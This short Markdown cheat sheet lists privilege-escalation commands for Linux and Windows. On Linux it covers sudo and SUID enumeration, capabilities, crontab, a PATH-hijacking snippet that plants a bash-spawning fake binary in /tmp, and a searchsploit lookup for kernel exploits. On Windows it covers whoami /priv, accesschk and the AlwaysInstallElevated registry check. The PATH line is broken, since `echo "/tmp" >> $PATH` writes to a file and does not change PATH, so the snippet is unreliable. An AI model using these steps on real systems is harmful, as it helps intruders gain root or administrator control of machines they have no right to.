# 🪜 Privilege Escalation Cheatsheet

## 🔐 Linux
```bash
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
```

## PATH Hijacking
```bash
echo "/tmp" >> $PATH
echo -e '#!/bin/bash\n/bin/bash' > /tmp/fake
chmod +x /tmp/fake
```

## Kernel Exploits
```bash
uname -a
searchsploit <kernel_version>
```

## 🪟 Windows
```powershell
whoami /priv
accesschk.exe /accepteula -uwcqv *
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```